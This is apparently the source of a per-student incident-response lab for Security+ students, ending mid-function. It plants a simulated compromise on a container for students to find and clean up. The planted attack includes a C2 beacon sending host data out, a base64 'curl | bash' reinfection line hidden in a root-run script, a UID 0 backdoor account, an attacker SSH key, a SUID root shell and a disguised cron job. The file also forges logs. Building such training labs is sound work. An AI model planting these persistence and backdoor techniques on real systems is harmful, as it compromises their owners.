"""Per-student lab environments for Security+ Blue Team Lab 01.

Topology (identical addressing for every student, fully isolated per student):

  DMZ 10.20.0.0/24 (bridge "dmz")
     WEB-01   10.20.0.10    compromised web server (Docker container, the student logs in here)
     FW-01    10.20.0.1     gateway between the DMZ and the internet
     DNS01    10.20.0.53    dnsmasq, also resolves the attacker's C2 domain
     MON-01   10.20.0.100   uptime monitor, requests http://10.20.0.10/ every 30 s
  INTERNET 203.0.113.0/24 (bridge "inet")
     FW-01    203.0.113.1
     C2       203.0.113.x   attacker's command-and-control web server (address unique per student)

Only WEB-01 is a container. The other devices are network namespaces whose
services run inside this process, which keeps memory use low.

The attack (planted at launch, values unique per student): SSH brute force
against a CI account, privilege escalation through a root-run script that the
account can edit, a disguised beacon started from cron, a UID 0 backdoor
account, an attacker SSH key, a SUID root shell, and a reinfection line in the
root-run script that pulls the implant back from the C2 server every 2 minutes.
"""
import asyncio
import base64
import datetime
import json
import logging
import os
import random
import secrets as pysecrets
import socket
import string
import struct
import time

log = logging.getLogger('netlab.lab')

WS_IMAGE = os.environ.get('NETLAB_WS_IMAGE', 'secplus-blue-lab01-workstation:latest')
STATE_DIR = os.environ.get('NETLAB_STATE', '/var/lib/netlab')
# Label on every workstation container this deployment creates, so cleanup never touches anything else.
INSTANCE = os.environ.get('NETLAB_INSTANCE', 'secplus-blue-lab01')
ROLES = ['sw', 'fw', 'dns', 'mon', 'c2']
OUI = {'ws': '00:50:56', 'fw0': '00:00:0c', 'fw1': '00:00:0c', 'dns': '00:50:56', 'mon': '00:50:56',
       'c2': '52:54:00'}

ACCOUNTS = ['deploy', 'webdeploy', 'cicd', 'webops']
C2_DOMAINS = ['cdn-sync-update.net', 'api-telemetry-cloud.com', 'static-edge-cache.net',
              'update-dbus-mirror.org', 'metrics-cdn-node.com']
IMPLANT_DIR = '/var/tmp/.font-unix'
IMPLANT = IMPLANT_DIR + '/dbus-sync'
SUID_SHELL = '/usr/local/lib/.cache/.dbus-helper'
BACKDOOR = 'sysupdate'
HEALTHCHECK = '/usr/local/bin/web-healthcheck.sh'
WEB_IP, FW_IP, DNS_IP, MON_IP = '10.20.0.10', '10.20.0.1', '10.20.0.53', '10.20.0.100'
CRON_LINE = ("* * * * * root /usr/bin/flock -n %s/.lock /bin/bash -c "
             "'exec -a \"[kworker/u4:1-events]\" /bin/bash %s' >/dev/null 2>&1\n" % (IMPLANT_DIR, IMPLANT))


class LabError(Exception):
    pass


async def run(*args, input=None, check=True, timeout=60):
    p = await asyncio.create_subprocess_exec(
        *args, stdin=asyncio.subprocess.PIPE if input is not None else asyncio.subprocess.DEVNULL,
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    try:
        out, err = await asyncio.wait_for(p.communicate(input), timeout)
    except asyncio.TimeoutError:
        p.kill()
        await p.wait()
        raise LabError('timeout running %s' % args[0])
    out = out.decode(errors='replace')
    err = err.decode(errors='replace')
    if check and p.returncode != 0:
        raise LabError('%s failed (%d): %s' % (' '.join(args[:5]), p.returncode, err.strip()[:400]))
    return p.returncode, out, err


def netns_socket(path, family=socket.AF_INET, type=socket.SOCK_STREAM):
    """Create a socket that lives in another network namespace (this thread only switches briefly)."""
    cur = os.open('/proc/thread-self/ns/net', os.O_RDONLY)
    try:
        tgt = os.open(path, os.O_RDONLY)
        try:
            os.setns(tgt, os.CLONE_NEWNET)
            try:
                s = socket.socket(family, type)
            finally:
                os.setns(cur, os.CLONE_NEWNET)
        finally:
            os.close(tgt)
    finally:
        os.close(cur)
    return s


def _pw(n=14):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(n))


def ssh_pubkey(comment):
    blob = struct.pack('>I', 11) + b'ssh-ed25519' + struct.pack('>I', 32) + os.urandom(32)
    return 'ssh-ed25519 %s %s' % (base64.b64encode(blob).decode(), comment)


def new_secrets():
    acct = random.choice(ACCOUNTS)
    attacker = '198.51.100.%d' % random.randint(20, 240)
    macs = {k: '%s:%02x:%02x:%02x' % (v, random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            for k, v in OUI.items()}
    return {
        'flags': {
            '1': 'SECP{beacon_in_the_noise_%s}' % os.urandom(3).hex(),
            '2': 'SECP{%s_%s}' % (attacker, acct),
        },
        'account': acct,
        'attacker_ip': attacker,
        'scanner_ip': '192.0.2.%d' % random.randint(20, 240),
        'c2_ip': '203.0.113.%d' % random.randint(20, 240),
        'c2_domain': random.choice(C2_DOMAINS),
        'acct_password': _pw(),
        'backdoor_password': _pw(),
        'ci_key': ssh_pubkey('ci@build-01'),
        'attacker_key': ssh_pubkey('backup@corp-nas'),
        'macs': macs,
    }


# ------------------------------------------------------------------ attacker artifacts

def b64(text):
    return base64.b64encode(text.encode()).decode()


def implant_script(sec):
    return ('#!/bin/bash\n'
            '# dbus session sync helper\n'
            'H="http://%s"\n'
            'S="%s"\n'
            'while :; do\n'
            '    curl -s -m 8 -A "Mozilla/5.0 (X11; Linux x86_64) dbus-sync/2.4" -H "X-Session: $S" \\\n'
            '        -d "id=$(hostname)&u=$(id -un)&up=$(cut -d. -f1 /proc/uptime)" "$H/api/v2/beacon" >/dev/null 2>&1\n'
            '    sleep 20\n'
            'done\n') % (sec['c2_domain'], sec['flags']['1'])


def dropper_script(sec):
    """What the C2 server hands out at /static/u.sh: reinstalls the implant and the backdoors."""
    blob = sec['attacker_key'].split()[1]
    return ('#!/bin/bash\n'
            'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n'
            'D=%(dir)s\n'
            'mkdir -p "$D"\n'
            '[ -s "$D/dbus-sync" ] || echo \'%(impl)s\' | base64 -d > "$D/dbus-sync"\n'
            'chmod 755 "$D/dbus-sync"\n'
            '[ -f /etc/cron.d/dbus-sync ] || echo \'%(cron)s\' | base64 -d > /etc/cron.d/dbus-sync\n'
            'id %(bd)s >/dev/null 2>&1 || { useradd -o -u 0 -g 0 -M -d /root -s /bin/bash '
            '-c "System Update Service" %(bd)s && echo \'%(bd)s:%(bdpw)s\' | chpasswd; }\n'
            'mkdir -p /root/.ssh && chmod 700 /root/.ssh\n'
            'grep -qF \'%(blob)s\' /root/.ssh/authorized_keys 2>/dev/null || '
            'echo \'%(key)s\' >> /root/.ssh/authorized_keys\n'
            'chmod 600 /root/.ssh/authorized_keys\n') % {
        'dir': IMPLANT_DIR, 'impl': b64(implant_script(sec)), 'cron': b64(CRON_LINE), 'bd': BACKDOOR,
        'bdpw': sec['backdoor_password'], 'blob': blob, 'key': sec['attacker_key']}


def tamper_lines(sec):
    payload = 'curl -fsS -m 8 http://%s/static/u.sh | bash\n' % sec['c2_domain']
    return '\n# OPS-118 telemetry\necho %s | base64 -d | bash >/dev/null 2>&1 &\n' % b64(payload)


def _ts(t):
    return datetime.datetime.fromtimestamp(t, datetime.timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f') + '+00:00'


def _clf(t):
    return datetime.datetime.fromtimestamp(t, datetime.timezone.utc).strftime('%d/%b/%Y:%H:%M:%S +0000')


def timeline(now):
    """Key moments of the attack, as epoch seconds (about 20 hours before launch)."""
    start = now - 26 * 3600
    login = now - 20 * 3600 + random.randint(-1800, 1800)
    return {'start': start, 'login': login}


def gen_auth_log(sec, now, tl):
    acct, atk, scan = sec['account'], sec['attacker_ip'], sec['scanner_ip']
    lines = []
    gid = [0]

    def add(t, prog, msg, newpid=True):
        # entries of one session share a process id; real ids are handed out after sorting by time
        if newpid:
            gid[0] += 1
        lines.append((t, gid[0], prog, msg))

    start, login = tl['start'], tl['login']
    # cron: web-healthcheck every 2 minutes all day, plus the implant's job every minute after the compromise
    t = start - start % 120
    while t < now:
        add(t + 0.02, 'CRON', 'pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)')
        add(t + 0.4, 'CRON', 'pam_unix(cron:session): session closed for user root', False)
        t += 120
    t = login + 300 - (login % 60)
    while t < now:
        if int(t) % 120:
            add(t + 0.03, 'CRON', 'pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)')
            add(t + 0.05, 'CRON', 'pam_unix(cron:session): session closed for user root', False)
        t += 60
    # CI deploys every 6 hours (legitimate, key based)
    fp = 'SHA256:' + base64.b64encode(os.urandom(32)).decode().rstrip('=')
    t = start + 1800
    while t < now:
        port = random.randint(40000, 60000)
        add(t, 'sshd-session', 'Accepted publickey for %s from 10.20.0.5 port %d ssh2: ED25519 %s' % (acct, port, fp))
        add(t + 0.1, 'sshd-session', 'pam_unix(sshd:session): session opened for user %s(uid=1001) by %s(uid=0)'
            % (acct, acct), False)
        add(t + 41, 'sshd-session', 'pam_unix(sshd:session): session closed for user %s' % acct, False)
        t += 6 * 3600
    # staff admin mistypes once, then logs in (legitimate)
    t = start + 3 * 3600 + 600
    add(t, 'sshd-session', 'Failed password for %s from 10.20.0.15 port %d ssh2' % (acct, random.randint(40000, 60000)))
    add(t + 6, 'sshd-session', 'Accepted password for %s from 10.20.0.15 port %d ssh2'
        % (acct, random.randint(40000, 60000)))
    add(t + 6.1, 'sshd-session', 'pam_unix(sshd:session): session opened for user %s(uid=1001) by %s(uid=0)'
        % (acct, acct), False)
    add(t + 400, 'sshd-session', 'pam_unix(sshd:session): session closed for user %s' % acct, False)
    # internet background noise: a scanner tries common user names and never gets in
    t = start + 5 * 3600
    for u in ['admin', 'test', 'ubuntu', 'oracle', 'pi', 'user', 'git', 'postgres', 'ftpuser', 'guest',
              'admin', 'support', 'test1', 'minecraft', 'hadoop']:
        port = random.randint(30000, 65000)
        add(t, 'sshd-session', 'Invalid user %s from %s port %d' % (u, scan, port))
        add(t + 2, 'sshd-session', 'Failed password for invalid user %s from %s port %d ssh2' % (u, scan, port), False)
        add(t + 2.5, 'sshd-session', 'Connection closed by invalid user %s %s port %d [preauth]' % (u, scan, port),
            False)
        t += random.uniform(3, 9)
    for _ in range(6):
        port = random.randint(30000, 65000)
        add(t, 'sshd-session', 'Failed password for root from %s port %d ssh2' % (scan, port))
        t += random.uniform(3, 9)
    # the attack: brute force against the CI account, then success
    t = login - 1100
    n = random.randint(130, 170)
    for i in range(n):
        port = random.randint(30000, 65000)
        add(t, 'sshd-session', 'Failed password for %s from %s port %d ssh2' % (acct, atk, port))
        if i % 6 == 5:
            add(t + 0.5, 'sshd-session', 'Connection reset by authenticating user %s %s port %d [preauth]'
                % (acct, atk, port), False)
        t += 1100.0 / n
    port = random.randint(30000, 65000)
    add(login, 'sshd-session', 'Accepted password for %s from %s port %d ssh2' % (acct, atk, port))
    add(login + 0.1, 'sshd-session', 'pam_unix(sshd:session): session opened for user %s(uid=1001) by %s(uid=0)'
        % (acct, acct), False)
    add(login + 95, 'sudo', '%8s : TTY=pts/0 ; PWD=/home/%s ; USER=root ; COMMAND=/usr/local/bin/web-healthcheck.sh'
        % (acct, acct))
    add(login + 95.1, 'sudo', 'pam_unix(sudo:session): session opened for user root(uid=0) by %s(uid=1001)' % acct,
        False)
    add(login + 95.6, 'sudo', 'pam_unix(sudo:session): session closed for user root', False)
    add(login + 190, 'useradd', 'new user: name=%s, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/0'
        % BACKDOOR)
    add(login + 191, 'chpasswd', 'pam_unix(chpasswd:chauthtok): password changed for %s' % BACKDOOR)
    add(login + 420, 'sshd-session', 'pam_unix(sshd:session): session closed for user %s' % acct)
    # the attacker comes back through the backdoor account
    t = login + 2400
    port = random.randint(30000, 65000)
    add(t, 'sshd-session', 'Accepted password for %s from %s port %d ssh2' % (BACKDOOR, atk, port))
    add(t + 0.1, 'sshd-session', 'pam_unix(sshd:session): session opened for user %s(uid=0) by %s(uid=0)'
        % (BACKDOOR, BACKDOOR), False)
    add(t + 330, 'sshd-session', 'pam_unix(sshd:session): session closed for user %s' % BACKDOOR, False)
    lines.sort(key=lambda x: x[0])
    pids, nxt, out = {}, random.randint(2000, 3000), []
    for t, g, prog, msg in lines:
        if g not in pids:
            nxt += random.randint(1, 30)
            pids[g] = nxt
        out.append('%s web-01 %s[%d]: %s\n' % (_ts(t), prog, pids[g], msg))
    return ''.join(out)


def gen_access_log(sec, now, tl):
    atk = sec['attacker_ip']
    out = []
    start = tl['start']
    t = start
    while t < now - 60:
        out.append((t, '%s - - [%s] "GET / HTTP/1.1" 200 292 "-" "MON-01 uptime-check/1.4"' % (MON_IP, _clf(t))))
        t += 30
    t = start - start % 120 + 1
    while t < now - 60:
        out.append((t, '127.0.0.1 - - [%s] "GET / HTTP/1.1" 200 292 "-" "curl/8.14.1"' % _clf(t)))
        t += 120
    pages = [('/', 292), ('/about.html', 196), ('/contact.html', 188), ('/robots.txt', 33)]
    uas = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0 Safari/537.36',
           'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Safari/605.1.15',
           'Mozilla/5.0 (iPhone; CPU iPhone OS 19_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
           'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)']
    for _ in range(220):
        t = random.uniform(start, now - 120)
        ip = '198.%d.%d.%d' % (random.choice([18, 19]), random.randint(0, 255), random.randint(1, 254))
        page, size = random.choice(pages)
        out.append((t, '%s - - [%s] "GET %s HTTP/1.1" 200 %d "-" "%s"' % (ip, _clf(t), page, size, random.choice(uas))))
    # the attacker's reconnaissance of the website before the SSH attack
    t = tl['login'] - 3000
    nse = 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)'
    for path, code, size in [('/', 200, 292), ('/robots.txt', 200, 33), ('/nmaplowercheck1764121', 404, 146),
                             ('/HNAP1', 404, 146), ('/evox/about', 404, 146)]:
        out.append((t, '%s - - [%s] "GET %s HTTP/1.1" %d %d "-" "%s"' % (atk, _clf(t), path, code, size, nse)))
        t += random.uniform(0.2, 1.5)
    t += 120
    for path in ['/.env', '/.git/config', '/backup/', '/admin/', '/wp-login.php', '/phpmyadmin/', '/server-status',
                 '/config.php.bak', '/backup.zip', '/.ssh/id_rsa', '/login', '/api/', '/uploads/', '/db.sql']:
        out.append((t, '%s - - [%s] "GET %s HTTP/1.1" 404 146 "-" "gobuster/3.8"' % (atk, _clf(t), path)))
        t += random.uniform(0.05, 0.3)
    out.sort(key=lambda x: x[0])
    return ''.join(l + '\n' for _, l in out)


def acct_history(sec):
    return '\n'.join([
        'id', 'sudo -l', 'ls -la /usr/local/bin/', 'cat /usr/local/bin/web-healthcheck.sh',
        "echo 'mkdir -p /usr/local/lib/.cache; cp /bin/bash %s; chmod 4755 %s' >> /usr/local/bin/web-healthcheck.sh"
        % (SUID_SHELL, SUID_SHELL),
        'sudo /usr/local/bin/web-healthcheck.sh', 'ls -la /usr/local/lib/.cache/', '%s -p' % SUID_SHELL,
        'exit', '']) + '\n'


def root_history(sec):
    return '\n'.join([
        'id', 'w', 'curl -s http://%s/static/u.sh -o /tmp/u.sh' % sec['c2_domain'], 'bash /tmp/u.sh',
        'rm -f /tmp/u.sh', 'ps auxf | grep kworker', 'nano /usr/local/bin/web-healthcheck.sh',
        'cat /etc/shadow', 'exit', '']) + '\n'


def setup_script(sec, now):
    tl = timeline(now)
    acct = sec['account']
    login = tl['login']
    files = [
        ('/var/log/auth.log', gen_auth_log(sec, now, tl), '640', 'root:adm', None),
        ('/var/log/nginx/access.log.hist', gen_access_log(sec, now, tl), '640', 'www-data:adm', None),
        ('/home/%s/.bash_history' % acct, acct_history(sec), '600', '%s:%s' % (acct, acct), login + 400),
        ('/root/.bash_history', root_history(sec), '600', 'root:root', login + 2700),
        ('/tmp/.d.sh', dropper_script(sec), '700', 'root:root', None),
    ]
    sh = ['set -e', 'export LC_ALL=C',
          'useradd -m -u 1001 -s /bin/bash -c "CI deploy" %s' % acct,
          "echo '%s:%s' | chpasswd" % (acct, sec['acct_password']),
          'usermod -aG www-data %s' % acct,
          "echo '%s ALL=(root) NOPASSWD: %s' > /etc/sudoers.d/web-ops" % (acct, HEALTHCHECK),
          'chmod 440 /etc/sudoers.d/web-ops',
          "sed -i 's/@ACCT@/%s/g' /opt/ir/README.txt" % acct,
          "touch -d '2026-10-01 09:30:00' /opt/ir/README.txt /opt/ir",
          # the weakness: the CI account owns a script that root runs from cron and sudo
          'chown %s:%s %s' % (acct, acct, HEALTHCHECK),
          'install -d -m 700 -o %s -g %s /home/%s/.ssh' % (acct, acct, acct),
          "printf '%%s\\n' '%s' '%s' > /home/%s/.ssh/authorized_keys" % (sec['ci_key'], sec['attacker_key'], acct),
          'chown %s:%s /home/%s/.ssh/authorized_keys' % (acct, acct, acct),
          'chmod 600 /home/%s/.ssh/authorized_keys' % acct]
    for path, text, mode, owner, _ in files:
        sh.append("base64 -d > %s <<'B64EOF'" % path)
        sh.append(base64.encodebytes(text.encode()).decode().rstrip('\n'))
        sh.append('B64EOF')
        sh.append('chmod %s %s && chown %s %s' % (mode, path, owner, path))
    sh += ['cat /var/log/nginx/access.log >> /var/log/nginx/access.log.hist',
           'cat /var/log/nginx/access.log.hist > /var/log/nginx/access.log && rm -f /var/log/nginx/access.log.hist',
           'bash /tmp/.d.sh && rm -f /tmp/.d.sh',
           'mkdir -p /usr/local/lib/.cache && cp /bin/bash %s && chmod 4755 %s' % (SUID_SHELL, SUID_SHELL),
           "echo '%s' | base64 -d >> %s" % (b64(tamper_lines(sec)), HEALTHCHECK)]
    stamps = [(SUID_SHELL, login + 96), ('/usr/local/lib/.cache', login + 96), (IMPLANT, login + 200),
              (IMPLANT_DIR, login + 200), ('/etc/cron.d/dbus-sync', login + 201), ('/root/.ssh/authorized_keys', login + 202),
              ('/root/.ssh', login + 202), ('/home/%s/.ssh/authorized_keys' % acct, login + 205),
              (HEALTHCHECK, login + 2580)]
    stamps += [(p, t) for p, _, _, _, t in files if t]
    for p, t in stamps:
        sh.append('touch -h -d @%d %s' % (int(t), p))
    sh.append('touch -d @%d /etc/passwd /etc/shadow /etc/group' % int(login + 190))
    # start the beacon now instead of waiting for cron
    sh.append("setsid -f /usr/bin/flock -n %s/.lock /bin/bash -c 'exec -a \"[kworker/u4:1-events]\" /bin/bash %s' "
              "</dev/null >/dev/null 2>&1" % (IMPLANT_DIR, IMPLANT))
    sh.append('echo SETUP_OK')
    return '\n'.join(sh) + '\n'


# ------------------------------------------------------------------ live checks

def check_script(sec, stage, acct_hash):
    blob = sec['attacker_key'].split()[1]
    if stage == '3':
        return '\n'.join([
            'r() { if eval "$2"; then echo "$1=1"; else echo "$1=0"; fi; }',
            "r implant_stopped '! pgrep -f dbus-sync >/dev/null'",
            "r implant_deleted '[ ! -e %s ]'" % IMPLANT,
            "r cron_clean '! grep -rqsE \"dbus-sync|font-unix\" /etc/cron.d /etc/crontab /var/spool/cron'",
            "r no_uid0 '! awk -F: \"\\$3==0 && \\$1!=\\\"root\\\" {f=1} END {exit !f}\" /etc/passwd'",
            "r key_removed '! grep -qsF %s /root/.ssh/authorized_keys /root/.ssh/authorized_keys2 "
            "/home/*/.ssh/authorized_keys /home/*/.ssh/authorized_keys2'" % blob,
        ]) + '\n'
    if stage == '4':
        f = HEALTHCHECK
        return '\n'.join([
            'r() { if eval "$2"; then echo "$1=1"; else echo "$1=0"; fi; }',
            "r script_clean '[ -f %s ] && grep -q nginx %s && ! grep -qE \"base64|%s|%s|dbus-helper|[|] *bash\" %s'"
            % (f, f, sec['c2_domain'].replace('.', '[.]'), sec['c2_ip'].replace('.', '[.]'), f),
            "r script_perms '[ -f %s ] && [ \"$(stat -c %%u %s)\" = 0 ] && [ $(( 0$(stat -c %%a %s) & 022 )) -eq 0 ]'"
            % (f, f, f),
            "r no_suid '[ -z \"$(find /usr/local /tmp /var/tmp /home /dev/shm /opt /root -xdev -perm -4000 -type f "
            "2>/dev/null | head -1)\" ]'",
            "H=$(getent shadow %s | cut -d: -f2)" % sec['account'],
            "r creds_reset '[ -n \"$H\" ] && [ \"$H\" != %s ]'" % ("'\"'\"'%s'\"'\"'" % acct_hash),
        ]) + '\n'
    raise ValueError(stage)


NGINX_404 = (b'<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1>'
             b'</center>\r\n<hr><center>nginx</center>\r\n</body>\r\n</html>\r\n')
NGINX_WELCOME = (b'<!DOCTYPE html>\n<html>\n<head>\n<title>Welcome to nginx!</title>\n</head>\n<body>\n'
                 b'<h1>Welcome to nginx!</h1>\n<p>If you see this page, the nginx web server is successfully '
                 b'installed and working.</p>\n</body>\n</html>\n')


class Env:
    def __init__(self, mgr, student):
        self.mgr = mgr
        self.sid = student['sid']
        self.username = student['username']
        self.password = student['password']
        self.sec = json.loads(student['secrets'])
        self.started = student['env_started'] or time.time()
        self.expires = student['env_expires'] or (self.started + 3600)
        self.servers = []
        self.tasks = []
        self.dnsmasq = None
        self.acct_hash = None
        self.beacons = 0

    def ns(self, role):
        return 'nl%s-%s' % (self.sid, role)

    def ns_path(self, role):
        return '/run/netns/' + self.ns(role)

    @property
    def container(self):
        return 'nl%s-ws' % self.sid

    @property
    def env_dir(self):
        return os.path.join(STATE_DIR, 'envs', self.sid)

    # ------------------------------------------------------------ build
    async def build(self):
        await self.teardown()
        os.makedirs(self.env_dir, exist_ok=True)
        await run('docker', 'run', '-d', '--name', self.container, '--hostname', 'web-01',
                  '--network', 'none', '--init', '--cap-add', 'NET_ADMIN',
                  '--memory', '192m', '--memory-swap', '384m', '--pids-limit', '200', '--cpus', '0.5',
                  '--sysctl', 'net.ipv6.conf.all.disable_ipv6=1',
                  '--sysctl', 'net.ipv6.conf.default.disable_ipv6=1',
                  '--label', 'netlab.instance=%s' % INSTANCE, '--label', 'netlab.sid=%s' % self.sid, WS_IMAGE)
        _, out, _ = await run('docker', 'inspect', '-f', '{{.State.Pid}}', self.container)
        pid = out.strip()
        if not os.path.exists('/proc/%s/ns/net' % pid):
            raise LabError('cannot see the workstation process. The lab container must run with '
                           '"pid: host" and "privileged: true" (see docker-compose.yml).')
        await run('ip', 'netns', 'attach', self.ns('ws'), pid)
        for r in ROLES:
            await run('ip', 'netns', 'add', self.ns(r))
            sysctls = ['net.ipv6.conf.all.disable_ipv6=1', 'net.ipv6.conf.default.disable_ipv6=1']
            if r == 'fw':
                sysctls.append('net.ipv4.ip_forward=1')
            await run('ip', 'netns', 'exec', self.ns(r), 'sysctl', '-q', '-w', *sysctls)
        await run('ip', 'netns', 'exec', self.ns('sw'), 'sysctl', '-q', '-w',
                  'net.bridge.bridge-nf-call-iptables=0', check=False)

        n = self.ns
        b = ['link set lo up',
             'link add dmz type bridge stp_state 0',
             'link add inet type bridge stp_state 0',
             'link add ws type veth peer name eth0 netns %s' % n('ws'),
             'link add fw0 type veth peer name eth0 netns %s' % n('fw'),
             'link add fw1 type veth peer name eth1 netns %s' % n('fw'),
             'link add dns type veth peer name eth0 netns %s' % n('dns'),
             'link add mon type veth peer name eth0 netns %s' % n('mon'),
             'link add c2 type veth peer name eth0 netns %s' % n('c2')]
        for p in ('ws', 'fw0', 'dns', 'mon'):
            b += ['link set %s master dmz' % p, 'link set %s up' % p]
        for p in ('fw1', 'c2'):
            b += ['link set %s master inet' % p, 'link set %s up' % p]
        b += ['link set dmz up', 'link set inet up']
        await run('ip', '-n', n('sw'), '-batch', '-', input=('\n'.join(b) + '\n').encode())

        m, s = self.sec['macs'], self.sec
        hosts = {
            'ws': ([('eth0', m['ws'], WEB_IP + '/24')], FW_IP),
            'fw': ([('eth0', m['fw0'], FW_IP + '/24'), ('eth1', m['fw1'], '203.0.113.1/24')], None),
            'dns': ([('eth0', m['dns'], DNS_IP + '/24')], FW_IP),
            'mon': ([('eth0', m['mon'], MON_IP + '/24')], FW_IP),
            'c2': ([('eth0', m['c2'], s['c2_ip'] + '/24')], '203.0.113.1'),
        }
        for role, (ifs, gw) in hosts.items():
            b = ['link set lo up']
            for dev, mac, cidr in ifs:
                b += ['link set %s address %s' % (dev, mac), 'addr add %s dev %s' % (cidr, dev),
                      'link set %s up' % dev]
            if gw:
                b.append('route add default via %s' % gw)
            await run('ip', '-n', n(role), '-batch', '-', input=('\n'.join(b) + '\n').encode())

        await self.start_services()
        _, out, err = await run('docker', 'exec', '-i', self.container, 'bash', '-s',
                                input=setup_script(s, time.time()).encode(), timeout=120)
        if 'SETUP_OK' not in out:
            raise LabError('setting up WEB-01 failed: %s' % err.strip()[-300:])
        await run('docker', 'exec', '-i', self.container, '/usr/local/sbin/ws-setup', self.username,
                  input=(self.password + '\n').encode())
        _, out, _ = await run('docker', 'exec', self.container, 'getent', 'shadow', s['account'])
        self.acct_hash = out.strip().split(':')[1]

    def is_intact(self):
        return all(os.path.exists(self.ns_path(r)) for r in ROLES + ['ws'])

    async def container_running(self):
        rc, out, _ = await run('docker', 'inspect', '-f', '{{.State.Running}}', self.container, check=False)
        return rc == 0 and out.strip() == 'true'

    # ------------------------------------------------------------ live checks
    async def check(self, stage):
        if self.acct_hash is None:
            _, out, _ = await run('docker', 'exec', self.container, 'getent', 'shadow', self.sec['account'],
                                  check=False)
            self.acct_hash = out.strip().split(':')[1] if out.count(':') > 2 else ''
        _, out, _ = await run('docker', 'exec', '-i', self.container, 'bash', '-s',
                              input=check_script(self.sec, stage, self.acct_hash).encode(), check=False, timeout=30)
        res = {}
        for line in out.splitlines():
            k, _, v = line.partition('=')
            if k:
                res[k.strip()] = v.strip() == '1'
        if stage == '3':
            res['c2_blocked'] = not await self._tcp_open('ws', self.sec['c2_ip'], 80)
        if stage == '4':
            res['site_up'] = await self._site_up()
        return res

    async def _tcp_open(self, role, ip, port, timeout=3):
        loop = asyncio.get_running_loop()
        s = netns_socket(self.ns_path(role))
        s.setblocking(False)
        try:
            await asyncio.wait_for(loop.sock_connect(s, (ip, port)), timeout)
            return True
        except Exception:
            return False
        finally:
            s.close()

    async def _site_up(self):
        loop = asyncio.get_running_loop()
        s = netns_socket(self.ns_path('mon'))
        s.setblocking(False)
        try:
            await asyncio.wait_for(loop.sock_connect(s, (WEB_IP, 80)), 4)
            await loop.sock_sendall(s, b'GET / HTTP/1.1\r\nHost: www.corp.local\r\nConnection: close\r\n'
                                       b'User-Agent: MON-01 uptime-check/1.4\r\n\r\n')
            data = b''
            while len(data) < 65536:
                chunk = await asyncio.wait_for(loop.sock_recv(s, 8192), 4)
                if not chunk:
                    break
                data += chunk
            return data.startswith(b'HTTP/1.1 200') and b'CorpNet' in data
        except Exception:
            return False
        finally:
            s.close()

    # --------------------------------------------------------- services
    async def start_services(self):
        self.servers.append(await self._tcp_server('c2', 80, self._c2))
        self.tasks.append(asyncio.create_task(self._monitor_loop()))
        await self.start_dns()

    async def _tcp_server(self, role, port, handler):
        s = netns_socket(self.ns_path(role))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(64)
        s.setblocking(False)
        return await asyncio.start_server(handler, sock=s)

    async def start_dns(self):
        conf = os.path.join(self.env_dir, 'dnsmasq.conf')
        txt = '\n'.join([
            'port=53', 'interface=eth0', 'bind-interfaces', 'no-resolv', 'no-hosts', 'no-poll',
            'domain-needed', 'pid-file=', 'user=nobody', 'group=nogroup', 'local=/corp.local/',
            'domain=corp.local', 'local-ttl=60',
            'host-record=web-01.corp.local,%s' % WEB_IP,
            'host-record=www.corp.local,%s' % WEB_IP,
            'host-record=fw-01.corp.local,%s' % FW_IP,
            'host-record=dns01.corp.local,%s' % DNS_IP,
            'host-record=mon-01.corp.local,%s' % MON_IP,
            'host-record=build-01.corp.local,10.20.0.5',
            'host-record=admin-pc.corp.local,10.20.0.15',
            'address=/%s/%s' % (self.sec['c2_domain'], self.sec['c2_ip']),
        ]) + '\n'
        with open(conf, 'w') as f:
            f.write(txt)
        await run('pkill', '-f', 'conf-file=%s' % conf, check=False)
        self.dnsmasq = await asyncio.create_subprocess_exec(
            'ip', 'netns', 'exec', self.ns('dns'), '/usr/sbin/dnsmasq', '--keep-in-foreground',
            '--conf-file=%s' % conf, stdin=asyncio.subprocess.DEVNULL,
            stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)

    async def watchdog(self):
        if self.dnsmasq is not None and self.dnsmasq.returncode is not None:
            log.warning('dnsmasq for %s exited, restarting', self.sid)
            await self.start_dns()

    async def _c2(self, reader, writer):
        """The attacker's command-and-control server, dressed up as a default nginx install."""
        try:
            head = await asyncio.wait_for(reader.readuntil(b'\r\n\r\n'), 15)
            lines = head.decode('latin-1').split('\r\n')
            parts = lines[0].split()
            method = parts[0] if parts else 'GET'
            path = (parts[1] if len(parts) > 1 else '/').split('?')[0]
            length = 0
            for ln in lines[1:]:
                k, _, v = ln.partition(':')
                if k.strip().lower() == 'content-length':
                    try:
                        length = min(int(v.strip()), 65536)
                    except ValueError:
                        pass
            if length:
                await asyncio.wait_for(reader.readexactly(length), 10)
            ctype = 'text/html'
            if method == 'POST' and path == '/api/v2/beacon':
                self.beacons += 1
                status, body, ctype = '200 OK', b'{"status":"ok","task":"sleep","next":20}\n', 'application/json'
            elif path == '/static/u.sh':
                status, body, ctype = '200 OK', dropper_script(self.sec).encode(), 'application/octet-stream'
            elif path in ('/', '/index.html'):
                status, body = '200 OK', NGINX_WELCOME
            else:
                status, body = '404 Not Found', NGINX_404
            hdr = ('HTTP/1.1 %s\r\nServer: nginx/1.18.0\r\nContent-Type: %s\r\nContent-Length: %d\r\n'
                   'Connection: close\r\n\r\n' % (status, ctype, len(body)))
            writer.write(hdr.encode() + (b'' if method == 'HEAD' else body))
            await writer.drain()
        except Exception:
            pass
        finally:
            try:
                writer.close()
            except Exception:
                pass

    async def _monitor_loop(self):
